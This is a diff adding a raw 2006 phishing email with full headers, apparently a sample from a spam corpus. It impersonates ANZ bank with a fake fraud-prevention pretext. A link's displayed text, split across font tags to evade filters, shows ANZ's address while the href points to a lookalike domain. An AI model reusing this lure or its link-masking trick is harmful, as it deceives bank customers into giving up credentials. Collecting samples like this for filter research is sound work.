@@ -1,0 +1,55 @@
+Return-Path: <root@host218.ipowerweb.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 426A246939
+	for <user@login.example.com>; Wed, 22 Nov 2006 13:04:05 -0500 (EST)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.example.org (Postfix) with ESMTP id 2A1C5131FAB0
+	for <user@example.com>; Wed, 22 Nov 2006 13:04:05 -0500 (EST)
+X-Spam-Score: 1.911
+X-Spam-Level: *
+X-Spam-Status: No, score=1.911 tagged_above=-100 required=3.999
+	tests=[HTML_MESSAGE=0.001, HTML_MIME_NO_HTML_TAG=0.512,
+	HTML_OBFUSCATE_10_20=1.397, MIME_HTML_ONLY=0.001]
+Received: from mail.example.org ([127.0.0.1])
+	by localhost (spammy.monkey.org [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id rAbfazhXoHHO for <user@example.com>;
+	Wed, 22 Nov 2006 13:03:58 -0500 (EST)
+X-Greylist: delayed 402 seconds by postgrey-1.27 at mail.example.org; Wed, 22 Nov 2006 13:03:58 EST
+Received: from host218.ipowerweb.com (host218.ipowerweb.com [66.235.203.161])
+	by mail.example.org (Postfix) with SMTP
+	for <user@example.com>; Wed, 22 Nov 2006 13:03:58 -0500 (EST)
+Received: (qmail 61286 invoked by uid 10015); 22 Nov 2006 17:56:38 -0000
+Received: from 127.0.0.1 by host218.ipowerweb.com (envelope-from <root@host218.ipowerweb.com>, uid 80) with qmail-scanner-1.25st 
+ (clamdscan: 0.88/1241. spamassassin: 3.1.0. perlscan: 1.25st.  
+ Clear:RC:1(127.0.0.1):SA:1(5.6/5.0):. 
+ Processed in 0.313959 secs); 22 Nov 2006 17:56:38 -0000
+Date: 22 Nov 2006 17:56:37 -0000
+Message-ID: <20061122175637.61259.qmail@host218.ipowerweb.com>
+To: user@example.com
+Subject: ANZ Online Banking Alert
+From: ANZ Support <ANZ@xtra.co.nz>
+Reply-To: ANZ@xtra.co.nz
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 454
+
+
+Dear user@example.com
+,<br><br> 
+ANZ is really concerned about our customers' security and therefore constantly elaborates new comprehensive data protection methods.<br><br> 
+Lately the unathorized attempts to withdraw cash from the bank accounts have become regular.<br> 
+We studied every fraudulent operation with duly care and managed to develop a criteria list, helpful to detect a suspicious operation.<br><br> 
+Currently we have developed an electronic bank accounts access security system, which is actually ready for implementation. The system follows the a.m. criteria and in certain situations asks a Secret Question the account holder has to answer.<br> 
+Alternatively the current transaction and the current account are blocked unless the payment details are clarified.<br><br> 
+We kindly ask you to fill out the Additional Authorization Form, necessary to activate the system.<br><br> 
+<a href="http://www.anzsupport.com/login.php"><font>ht</font><font>tp</font><font>://w</font><font>ww.</font><font>anz</font><font>.co</font><font>m/i</font><font>net</font><font>bank</font><font>/bankmain</font><font>.asp</font></a><br><br>  
+©Copyright Australia and New Zealand Banking Group Limited ABN 11 005 357 522, 1996-2006 
+
+
+
